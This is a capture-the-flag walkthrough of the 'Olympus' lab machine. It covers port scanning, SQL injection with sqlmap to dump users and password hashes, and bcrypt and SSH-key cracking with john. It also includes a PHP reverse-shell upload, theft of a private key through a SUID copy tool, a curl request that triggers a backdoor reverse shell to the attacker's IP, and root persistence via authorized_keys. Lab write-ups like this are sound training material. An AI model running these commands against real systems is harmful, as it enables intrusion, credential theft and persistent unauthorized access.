**Target: 10.10.105.247   Olympus**

**Initial Access:**\
nmap -Pn  10.10.105.247 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ','\
Output shows  open ports: 22,80

Enumerating these open ports further with nmap:\
nmap -Pn  10.10.105.247 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.olympus\
Output shows: 

![image](https://user-images.githubusercontent.com/93153300/198897655-4ff012d9-ac8f-4a25-9f44-6495e11767ac.png)

Nmap shows that port 80 is trying to redirect to olympus.thm. To make the redirect work, let’s add the following to /etc/hosts:  10.10.105.247   olympus.thm

Run directory brute force on port 80 with: dirsearch -r -u http://olympus.thm/ -e txt,php,html -f -w /usr/share/seclists/Discovery/Web-Content/common.txt\
Dirsearch found http://olympus.thm/~webmaster

Navigating to directory /~webmaster shows:

![image](https://user-images.githubusercontent.com/93153300/198897665-9094fb42-1a16-4c90-a3e7-7b1ea732ec7c.png)

The top left corner shows Victor’s CMS.  Let’s check for exploits on victor cms with command:   searchsploit victor

![image](https://user-images.githubusercontent.com/93153300/200088352-a7c47cdf-3bd0-41e4-9167-adf823a120d3.png)

Open the exploit 48734.txt with command: searchsploit -x  php/webapps/48734.txt  

![image](https://user-images.githubusercontent.com/93153300/198897674-f247569f-5ca4-4037-84d0-6af51c71d847.png)

The exploit shows that the parameter 'search' is vulnerable to sql injection.  As shown in the exploit, we will use sqlmap to extract sensitive information: sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search –dbs \
Sqlmap found 6 databases:

![image](https://user-images.githubusercontent.com/93153300/198897682-58ae695d-4009-4b4a-8020-a7098814a1e8.png)

Let’s get the table names on olympus:
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus –tables\
Output shows:

![image](https://user-images.githubusercontent.com/93153300/198897695-d1a8d8d2-838b-4399-b703-fb5fe2efdb7a.png)

Table flag contains the first flag. To dump the flag use:\
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T flag --columns -C flag --dump

There is another interesting table called users.  Check the columns for the table 'users':\
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns

Found columns user_name and user_password.  Dump the information to those 2 columns:\
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns -C user_name,user_password --dump

![image](https://user-images.githubusercontent.com/93153300/198897708-5a29bbfa-51d1-4d45-b7e3-8d4a4267d572.png)
Looks like we found 3 users, and their hashed passwords.  Use john to try and crack the hashes.  First, check what hash type we are dealing with, as we will want to tell john the hash type.   Use command nth:  nth -t '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C'\
nth command says it’s a bcrypt hash.  Put the 3 hashes into a file and name it hash. The file should look like this:

![image](https://user-images.githubusercontent.com/93153300/198897711-80e4a730-a0f8-4aad-a05a-ca8780415bb6.png)

Now we are ready to use john:\
john hash --wordlist=/usr/share/wordlists/rockyou.txt –format=bcrypt\
John was able to crack one of the hashes, the prometheus user hash.  The cracked hash is summertime.

Looking back at our webpage, http://olympus.thm/~webmaster/index.php, there’s a login page:

![image](https://user-images.githubusercontent.com/93153300/198897716-7c94ef7b-9dca-4b87-8d4c-23a7527bdff2.png)

Use the found credentials (username prometheus, password summertime) to log in.  It works, and we get logged in as prometheus admin:

![image](https://user-images.githubusercontent.com/93153300/198897734-afef6dfb-5fb4-4590-a3f3-9c905f47618f.png)
  
On the left column, click on the Users → view all users.  It will show the following:

![image](https://user-images.githubusercontent.com/93153300/198897748-d878e9b2-9c9c-48a6-80a6-e54e1a5e9b96.png)

Looking over the emails, it seems like chat.olumpus.thm is a subdomain.  Add to /etc/hosts: 10.10.105.247  chat.olympus.thm\
Navigating to that page redirects us to a directory /login, which is a login page:

![image](https://user-images.githubusercontent.com/93153300/198897755-6f535d59-f947-4a1f-8903-0fcd9fcd5d64.png)

Trying username prometheus and password summertime works. The login redirects us to a directory /home.php:

![image](https://user-images.githubusercontent.com/93153300/198897773-8cf02699-e362-4059-b29b-6982aa6634d9.png)

Looks like we can upload files at the bottom with browse → send.  Upload a php pentestmonkey reverse shell and called it friends.php.  Couldn’t find where it uploads to, chat also indicates that the file we upload doesn’t remain with the same name. Use directory brute force to see if we can find something of interest relating to our upload:\
dirsearch -r -u http://chat.olympus.thm/ -e txt,php -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –cookie="PHPSESSID=jcvg5adrcrtqbu9ca5tj5ovkmv"

Dirsearch finds directory /uploads/, navigating to /uploads/ is just a blank page.    Going back to the sql injection we used earlier, let’s check if we can find the file we uploaded and the name it changed to.

sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables 

![image](https://user-images.githubusercontent.com/93153300/198897790-1ddd3aff-ebc5-461b-9151-dea5a64c17e4.png)
 
Our domain is chat.olympus.thm, so let’s look at table 'chats'.\
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T chats --columns

![image](https://user-images.githubusercontent.com/93153300/198897798-923a38ee-5d74-4599-a566-2cc98cfea6df.png)
 
Column 'file' is interesting, sounds like it should show us the files uploaded.\
sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T chats --columns -C file –dump

![image](https://user-images.githubusercontent.com/93153300/198897805-83b7621f-af1e-4609-a6e7-73ba56fcca00.png)
 
If this b3dac2401ad697c22fbe4050ff14b19c.php file is our pentestmonkey reverse shell, then putting that into /uploads/ should get us a reverse shell on a netcat listener.\
Open netcat listener: nc -lvnp 443 (I’ll use pwncat-cs -lp 443, as it gives a better shell than netcat)\
Copy b3dac2401ad697c22fbe4050ff14b19c.php and paste it into the directory we found earlier of /uploads.  Should look like this: http://chat.olympus.thm/uploads/b3dac2401ad697c22fbe4050ff14b19c.php

It worked, we have a shell as www-data\
Can get the user flag at /home/zeus/user.flag.
___________________________________________________
**Lateral Movement:**\
Check for suid:   find / -perm /4000 2>/dev/null\
Found an interesting suid file owned by user zeus: 

![image](https://user-images.githubusercontent.com/93153300/198897816-704fd3b4-8b15-49ea-a23d-4b8a7fe96296.png)

Running /usr/bin/cputils, it first asks to “enter the name of source file”, then it asks to “enter the name of target file”.  If done right, after finished it will say file copied successfully.  Seems like cputils copies files.  Looking at /home/zeus we see a directory .ssh, however we don’t have permissions to open that directory as www-data.  Let’s try to use cputils to copy zeus’s private ssh key:

![image](https://user-images.githubusercontent.com/93153300/198897821-6f306006-e071-4335-9ac6-5831369498b1.png)


We now have zeus’s private ssh key.  Use that to ssh in as zeus. First, download the private ssh key.  Then give the private key proper permissions so it doesn’t error: chmod 600 id_rsatarget.\
Finally use the key to ssh in as zeus:\
ssh -i id_rsatarget zeus@10.10.105.247

It asks for a passphrase, so we can’t log in yet, we need to figure out the passphrase.  Use john to crack the passphrase.  First, convert the id_rsatarget key into a hash john can work with.  Use command: ssh2john id_rsatarget > john.txt \
Next crack the hash to get the passphrase with command: john john.txt –wordlist=/usr/share/wordlists/rockyou.txt\
It worked, the passphrase is snowflake

Back to logging in with ssh private key:\
ssh -i id_rsatarget zeus@10.10.105.247 → when prompts for passphrase, enter snowflake\
We’re in, we have shell as zeus.
______________________________________________________
**Privilege Escalation**:\
/var/www  directory shows 3 directories: olympus.thm, chat.olympus.thm, and html.  We have already been on 2 of them: olympus.thm and chat.olympus.thm.  Let’s check out the html directory:

![image](https://user-images.githubusercontent.com/93153300/198897833-c9b0b8b3-a026-47f3-94cd-46c6234f205a.png)

When we tried to go to http://10.10.105.247 it redirects to olympus.thm.  However, navigating to http://10.10.105.247/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php gets a page we haven’t seen yet: 

![image](https://user-images.githubusercontent.com/93153300/198897841-a96156a0-2c0c-4ac7-974c-a8b6aad4b664.png)
 
We don’t know the password, so on our shell as zeus, check file VIGQFQFMYOST.php to see if it contains the password: cat VIGQFQFMYOST.php:

![image](https://user-images.githubusercontent.com/93153300/198897845-31ec9f74-b153-4782-bfe1-2954f33550e2.png)

Found the password: a7c5ffcf139742f52a5267c4a0674129\
Back to the website, enter the password ‘a7c5ffcf139742f52a5267c4a0674129’. It works, the page now shows:

![image](https://user-images.githubusercontent.com/93153300/198901456-7f6f66cb-f4bc-4135-aeba-c87d68e2ff0d.png)
 
Looks like instructions to get a reverse shell.  Looking back at file VIGQFQFMYOST.php:

![image](https://user-images.githubusercontent.com/93153300/198901467-cf0e216b-fb04-4373-8ecc-1220e01b7511.png)
 
The source code shows that to get a reverse shell we need to send a request, send the correct password, and open a netcat listener.  Based on the source code, our curl request should look like this:\
curl "http://10.10.123.224/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.2.1.148&port=443" --data "password=a7c5ffcf139742f52a5267c4a0674129"

Open netcat listener: nc -lvp 443.  → Run the curl request → we have shell as root:

![image](https://user-images.githubusercontent.com/93153300/198901474-5854cd16-98dd-480d-a48a-c969edeb30d0.png)











Another way of getting root:\
The source code in file VIGQFQFMYOST.php shows a command that we can run from our zeus shell that will get us root:

![image](https://user-images.githubusercontent.com/93153300/198897851-c4aa05da-3d18-45cf-ba55-9d1c037425fd.png)

From zeus shell, run command:  uname -a; w; $suid_bd\
We have shell as root, get the flag: cat /root/root.flag.\
We get the flag and some additional information.  The file root.flag says: \
“PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)”
___________________________________________________
**Persistence and getting the final flag**:\
Create ssh keys with command: ssh-keygen \
To be able to log in with the private key we just created, we need to copy the public key we just created into a file called authorized_keys. Use command: cp id_rsa.pub authorized_keys \
Download the ssh private key and change the file to proper permissions so that it doesn’t error with command: chmod 600 id_rsa_roottarget\
ssh into the target as root with command: ssh -i id_rsa_roottarget root@10.10.105.247

Search for the final flag with command: \
grep -riI "flag{" / 2>/dev/null           →       Found the flag in etc/ssl/private/.b0nus.fl4g
